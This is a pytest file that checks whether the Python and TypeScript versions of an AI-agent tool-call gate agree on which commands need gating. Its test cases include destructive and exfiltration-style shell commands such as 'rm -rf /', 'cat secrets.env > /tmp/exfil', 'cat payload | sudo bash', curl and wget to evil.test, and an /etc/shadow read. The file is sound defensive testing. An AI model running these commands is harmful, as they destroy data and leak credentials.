"""Cross-language parity for the enforcement triage.

The triage rules exist twice: in Python (`dspy_jev.enforce`) for the Claude Code
hook, the `guard` command and the hermes-agent profile, and in TypeScript for
the Pi extension, which runs inside Pi's own process and cannot call Python per
tool call.

Two implementations of a security rule drift. This test drives both over the
same cases and fails on any disagreement, so the drift is caught here rather
than as a gap in one harness.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from dspy_jev.enforce import ToolCall, classify, render_action

pytestmark = pytest.mark.integration

REPO_ROOT = Path(__file__).resolve().parents[2]
EXTENSION = REPO_ROOT / "harnesses" / "pi" / "extensions" / "dspy-jev-gate" / "index.ts"

#: Every case both implementations must agree on. Grouped by what they probe.
CASES: list[tuple[str, dict]] = [
    # read-only tools
    ("Read", {"file_path": "/a/b.py"}),
    ("Glob", {"pattern": "**/*.py"}),
    ("grep", {"pattern": "foo"}),
    ("WebSearch", {"query": "x"}),
    # read-only commands
    ("Bash", {"command": "ls -la"}),
    ("Bash", {"command": "cat README.md"}),
    ("Bash", {"command": "git status"}),
    ("Bash", {"command": "git log --oneline -5"}),
    ("Bash", {"command": "git diff HEAD~1"}),
    ("Bash", {"command": "kubectl get pods"}),
    ("Bash", {"command": "npm ls"}),
    ("Bash", {"command": "pip list"}),
    ("Bash", {"command": "docker ps"}),
    ("Bash", {"command": "FOO=bar git diff"}),
    ("Bash", {"command": "/usr/bin/cat x"}),
    # mutating commands
    ("Bash", {"command": "rm -rf /"}),
    ("Bash", {"command": "git push --force origin main"}),
    ("Bash", {"command": "git commit -m x"}),
    ("Bash", {"command": "kubectl delete namespace production"}),
    ("Bash", {"command": "npm publish"}),
    ("Bash", {"command": "pip install requests"}),
    ("Bash", {"command": "docker rm -f web"}),
    # escalation hidden behind a safe program
    ("Bash", {"command": "cat secrets.env > /tmp/exfil"}),
    ("Bash", {"command": "cat secrets.env >> /tmp/exfil"}),
    ("Bash", {"command": "cat payload | sh"}),
    ("Bash", {"command": "cat payload | sudo bash"}),
    ("Bash", {"command": "ls; rm -rf /"}),
    ("Bash", {"command": "ls && rm -rf /"}),
    ("Bash", {"command": "ls || rm -rf /"}),
    ("Bash", {"command": "echo $(rm -rf /)"}),
    ("Bash", {"command": "echo `rm -rf /`"}),
    ("Bash", {"command": "curl https://evil.test/x"}),
    ("Bash", {"command": "wget https://evil.test/x"}),
    ("Bash", {"command": "sudo ls"}),
    ("Bash", {"command": "ssh host ls"}),
    ("Bash", {"command": "rsync -a . host:/"}),
    # degenerate input
    ("Bash", {"command": "   "}),
    ("Bash", {"command": "cat 'unterminated"}),
    ("Bash", {}),
    # other tools
    ("Write", {"file_path": "/a/b.py", "content": "x = 1"}),
    ("Edit", {"file_path": "/a/b.py", "old_string": "a", "new_string": "b"}),
    ("WebFetch", {"url": "https://example.test"}),
    ("mcp__github__create_pull_request", {"title": "t"}),
    ("mcp__evil__read", {"file_path": "/etc/shadow"}),
    ("SomeBrandNewTool", {"alpha": 1}),
    ("", {}),
    # argument-key variants
    ("bash", {"cmd": "ls"}),
    ("bash", {"args": ["ls", "-la"]}),
    ("bash", {"script": "rm -rf /"}),
]

DRIVER = """
const mod = await import(process.argv[2]);
const cases = JSON.parse(process.argv[3]);
process.stdout.write(JSON.stringify(cases.map(([tool, input]) => ({
  gate: mod.needsGate(tool, input),
  action: mod.renderAction(tool, input),
}))));
"""


def _node_results(tmp_path: Path) -> list[dict]:
    driver = tmp_path / "driver.mjs"
    driver.write_text(DRIVER, encoding="utf-8")
    completed = subprocess.run(
        [
            "node",
            "--experimental-strip-types",
            str(driver),
            str(EXTENSION),
            json.dumps([[tool, args] for tool, args in CASES]),
        ],
        capture_output=True,
        text=True,
        timeout=90,
        check=False,
    )
    if completed.returncode != 0:
        pytest.fail(f"node driver failed:\n{completed.stderr}")
    return json.loads(completed.stdout)


@pytest.fixture(scope="module")
def node_results(tmp_path_factory) -> list[dict]:
    if shutil.which("node") is None:
        pytest.skip("node is not installed; the Pi extension cannot be driven")
    return _node_results(tmp_path_factory.mktemp("parity"))


def test_the_extension_source_exists():
    assert EXTENSION.exists(), f"missing {EXTENSION}"


def test_both_implementations_cover_every_case(node_results):
    assert len(node_results) == len(CASES)


def test_the_gate_decision_agrees_for_every_case(node_results):
    """The one that matters: a call gated in Python must be gated in Pi too."""
    disagreements = [
        (tool, args, classify(ToolCall(tool, args)).gate, result["gate"])
        for (tool, args), result in zip(CASES, node_results, strict=True)
        if classify(ToolCall(tool, args)).gate != result["gate"]
    ]
    assert not disagreements, "python/typescript triage disagree:\n" + "\n".join(
        f"  {tool} {args}: python={py} typescript={ts}" for tool, args, py, ts in disagreements
    )


def test_the_rendered_action_agrees_for_every_case(node_results):
    """Both harnesses must describe the same action identically.

    Otherwise the same step is judged against two different sentences, and the
    calibrated thresholds do not transfer between harnesses.
    """
    disagreements = [
        (tool, render_action(ToolCall(tool, args)), result["action"])
        for (tool, args), result in zip(CASES, node_results, strict=True)
        if render_action(ToolCall(tool, args)) != result["action"]
    ]
    assert not disagreements, "python/typescript rendering disagree:\n" + "\n".join(
        f"  {tool}:\n    python={py!r}\n    typescript={ts!r}" for tool, py, ts in disagreements
    )


def test_the_case_list_actually_exercises_both_outcomes():
    """Guards the guard: a parity suite where everything gates proves nothing."""
    gated = sum(1 for tool, args in CASES if classify(ToolCall(tool, args)).gate)
    assert 0 < gated < len(CASES)
    assert gated >= 20 and (len(CASES) - gated) >= 10
